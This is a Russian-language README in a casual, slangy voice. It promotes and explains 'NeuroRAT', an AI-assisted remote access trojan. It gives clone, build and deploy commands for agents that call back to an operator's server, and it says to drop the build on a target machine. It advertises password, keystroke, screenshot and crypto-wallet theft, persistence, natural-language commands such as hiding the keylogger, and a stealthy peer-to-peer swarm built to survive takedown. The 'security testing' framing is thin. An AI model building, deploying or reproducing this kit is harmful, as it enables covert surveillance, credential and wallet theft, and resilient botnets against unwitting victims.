ЧТО ТАКОЕ NEURORAT И КАК ЕГО ИСПОЛЬЗОВАТЬ

Привет, братан! Короче, NeuroRAT - это такая крутая штука для тестирования защиты компьютеров.
Название расшифровывается как "нейронный удаленный инструмент доступа". Это как обычный RAT,
только с мозгами. Реально понимает что от него хотят, даже если ты объясняешь как обычный
человек, а не как программист.

ЧТО ОН ДЕЛАЕТ?

Короче, эта штука может:
- Подключаться к компу и сидеть там тихонько
- Собирать разную инфу (пароли, историю браузера, скриншоты, нажатия клавиш)
- Искать крипто-кошельки и их ключи
- Выполнять команды, которые ты ему говоришь
- Сам принимать решения с помощью ИИ, если ты занят
- Работает на Windows, Mac и Linux

УСТАНОВКА - ЭТО ЛЕГКО

1. Качаем репозиторий:
   ```
   git clone https://github.com/your-repository/neurorat.git
   cd neurorat
   ```

2. Ставим зависимости:
   ```
   pip install -r requirements.txt
   ```

3. Запускаем сервер:
   ```
   python server_monitor.py
   ```

4. Собираем агента для нужной системы:
   ```
   python build_agent.py --server-host твой.айпи.или.домен --server-port 443 --output папка --type exe
   ```

5. Скидываем собранный файл на целевую машину и запускаем.

6. Profit! Теперь можешь управлять через веб-интерфейс на http://localhost:8080

КАК ИСПОЛЬЗОВАТЬ

1. ВЕБ-ИНТЕРФЕЙС:
   - Заходишь на http://localhost:8080
   - Видишь всех подключенных агентов
   - Выбираешь, с кем работать
   - Отправляешь команды напрямую или через ИИ

2. ЧЕРЕЗ API:
   - Если хочешь автоматизировать, можешь юзать API
   - Адрес: http://localhost:8080/api
   - Не забудь токен в заголовке: "Authorization: Bearer твой-токен"

КОМАНДЫ ИИ - ГОВОРИ КАК ХОЧЕШЬ

Просто пиши что надо сделать обычным языком, например:
- "Найди все пароли на компе"
- "Сделай скриншот"
- "Покажи, что печатает пользователь"
- "Найди файлы с биткоин-кошельками"
- "Сделай кейлоггер невидимым"

ИИ поймет и переведет это в правильные команды.

СОБИРАЕМ АГЕНТА ПОД РАЗНЫЕ ПЛАТФОРМЫ

1. Windows (EXE файл):
   ```
   python build_agent.py --server-host твой.сервер.com --server-port 443 --type exe --output dist
   ```

2. Любая система (ZIP архив):
   ```
   python build_agent.py --server-host твой.сервер.com --server-port 443 --type zip --output dist
   ```

3. One-liner для быстрого запуска (Base64):
   ```
   python build_agent.py --server-host твой.сервер.com --server-port 443 --type base64 --output dist
   ```

СОВЕТЫ ОТ ПАЦАНОВ

1. Всегда меняй настройки по умолчанию, особенно порты и ключи шифрования.

2. Используй домен вместо IP, так надежнее.

3. Чтобы агент всегда запускался автоматом, добавь опцию `--persist yes`.

4. Если хочешь сделать свой модуль, просто добавь новый файл в папку agent_modules.

5. Тестируй сначала на своей системе, не будь лохом.

РЕШЕНИЕ ПРОБЛЕМ

Если агент не подключается:
- Проверь фаерволл на сервере
- Убедись, что порт открыт
- Проверь адрес и порт в конфиге

Если модули не работают:
- Убедись, что все зависимости установлены
- Проверь права доступа (особенно на Linux/Mac)

Проблемы с ИИ:
- Проверь API ключ
- Убедись, что сервер может достучаться до API ИИ

РОЕВОЙ ИНТЕЛЛЕКТ - СУПЕРФУНКЦИЯ

Короче, мы добавили самую крутую штуку - роевой интеллект! Это когда все твои 
агенты могут работать вместе даже без сервера. Они как муравьи в муравейнике - 
каждый сам по себе не особо умный, но вместе они становятся мощной системой.

КАК ЭТО РАБОТАЕТ?

1. Каждый агент может напрямую общаться с другими агентами.
2. Агенты вместе принимают решения через голосование.
3. Задачи распределяются между всеми, кто может их лучше сделать.
4. Если один агент пропадает, остальные продолжают работать.
5. Всё шифруется, так что никто не поймет, что они общаются.

ЧТО ЭТО ДАЕТ?

- Невозможно вырубить одним ударом - убьешь один агент, остальные работают
- Не нужно постоянно общаться с сервером, меньше шансов спалиться
- Можно выполнять сложные задачи совместно, распределяя работу
- Если связь с главным сервером пропадет, агенты продолжат работать

КАК ИСПОЛЬЗОВАТЬ:

```python
# Включаем роевой интеллект
swarm = SwarmNode(
    bootstrap_nodes=["192.168.1.100:8443"],  # Первые узлы для подключения
    stealth_mode=True  # Максимальная скрытность
)

# Запускаем
swarm.start()
```
